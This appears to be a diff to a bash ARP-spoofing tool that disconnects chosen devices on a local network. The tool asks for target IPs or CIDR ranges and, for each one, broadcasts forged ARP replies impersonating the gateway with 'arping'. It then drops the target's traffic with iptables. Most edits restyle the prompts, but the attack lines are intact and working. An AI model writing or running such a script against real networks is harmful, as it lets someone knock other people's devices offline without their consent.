@@ -1,9 +1,5 @@
 #!/bin/bash
 
-# Set iptables drop policy
-iptables -P FORWARD DROP
-iptables -I FORWARD -j DROP
-
 # Enable ip forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
@@ -11,9 +7,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 cat > /bin/spoofer-stop << EOF
 #!/bin/bash
 
-# Reset forwarding policy
-iptables -P FORWARD ACCEPT
-iptables -F FORWARD
+# flush prerouting tables 
 iptables -t mangle -F PREROUTING
 
 # Kill arping processes
@@ -148,11 +142,11 @@ fi
 
 # Get targets
 echo " "
-echo "Enter target(s):"
-echo "  - Single IP: 192.168.1.100"
-echo "  - Multiple IPs: 192.168.1.100 192.168.1.101 192.168.1.102"
-echo "  - CIDR range: 192.168.1.0/24"
-echo "  - Mixed: 192.168.1.100 192.168.1.0/24 192.168.1.101"
+echo "[*] Enter the Target [*]"
+echo "[*] Single IP: 192.168.1.100"
+echo "[*] Multiple IPs: 192.168.1.100 192.168.1.101 192.168.1.102"
+echo "[*] CIDR range: 192.168.1.0/24"
+echo "[*] Mixed: 192.168.1.100 192.168.1.0/24 192.168.1.101"
 read -rp "Target(s): " TARGETS_INPUT
 
 if [[ -z "$TARGETS_INPUT" ]]; then
@@ -170,11 +164,11 @@ if [[ -z "$PROCESSED_TARGETS" ]]; then
 fi
 
 echo
-echo "Configuration:"
-echo "  Interface:  $INTERFACE"
-echo "  Device IP:  $DEVICE_IP"
-echo "  Gateway:    $GATEWAY"
-echo "  Targets:"
+echo "[*] Target Configuration [*]"
+echo "[*] Interface: | $INTERFACE"
+echo "[*] Device:    | $DEVICE_IP"
+echo "[*] Gateway:   | $GATEWAY"
+echo "[*] Target:"
 while IFS= read -r target; do
     echo "    - $target"
 done <<< "$PROCESSED_TARGETS"
@@ -188,7 +182,7 @@ echo
         if [[ -n "$target" ]]; then
             echo " "
             echo "Blocking the target IP: $target"
-            iptables -t mangle -I PREROUTING -i "$INTERFACE" -s "$target" -j TTL --ttl-set 0
+            iptables -t mangle -A PREROUTING -s "$target" -j DROP
           ( arping -b -A -i "$INTERFACE" -S "$GATEWAY" "$target" >/dev/null 2>&1 ) &
             pid1=$!
             pids+=($pid1)
